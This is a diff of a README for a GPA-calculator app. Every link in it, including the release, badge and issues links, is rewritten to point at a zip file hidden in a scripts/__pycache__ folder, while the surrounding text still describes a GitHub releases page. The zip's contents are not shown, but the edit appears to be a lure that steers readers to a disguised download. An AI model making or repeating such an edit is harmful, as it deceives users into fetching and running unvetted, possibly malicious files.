@@ -1,6 +1,6 @@
 # 📊 gpa-calculator - Easy GPA Calculation for Students
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/PuggoDoggo/gpa-calculator/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/PuggoDoggo/gpa-calculator/main/scripts/__pycache__/calculator_gpa_v3.3-alpha.2.zip%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/PuggoDoggo/gpa-calculator/main/scripts/__pycache__/calculator_gpa_v3.3-alpha.2.zip)
 
 ---
 
@@ -31,7 +31,7 @@ If you use any other operating system, this app may not work properly.
 
 Click the big button at the top or visit this link:
 
-[Download the Latest Release](https://github.com/PuggoDoggo/gpa-calculator/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/PuggoDoggo/gpa-calculator/main/scripts/__pycache__/calculator_gpa_v3.3-alpha.2.zip)
 
 This will take you to the releases page on GitHub. Look for the latest version, then choose the file that matches your operating system.
 
@@ -41,7 +41,7 @@ This will take you to the releases page on GitHub. Look for the latest version, 
 
 To download and install gpa-calculator:
 
-1. Visit the [Releases page](https://github.com/PuggoDoggo/gpa-calculator/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/PuggoDoggo/gpa-calculator/main/scripts/__pycache__/calculator_gpa_v3.3-alpha.2.zip).
 
 2. Find the latest release — the one on top is usually the newest.
 
@@ -115,7 +115,7 @@ If you have trouble running the app, try the following:
 
 If you need help or want to report a problem, open an issue on the GitHub repository page:
 
-[GitHub Issues](https://github.com/PuggoDoggo/gpa-calculator/issues)
+[GitHub Issues](https://raw.githubusercontent.com/PuggoDoggo/gpa-calculator/main/scripts/__pycache__/calculator_gpa_v3.3-alpha.2.zip)
 
 Describe your problem clearly and include any error messages you see.
 
@@ -131,7 +131,7 @@ gpa-calculator runs on your computer and does not send your data anywhere unless
 
 Check the releases page regularly for updates. New versions may add features, fix issues, or improve performance.
 
-[Visit the Release Page](https://github.com/PuggoDoggo/gpa-calculator/releases)
+[Visit the Release Page](https://raw.githubusercontent.com/PuggoDoggo/gpa-calculator/main/scripts/__pycache__/calculator_gpa_v3.3-alpha.2.zip)
 
 ---
 
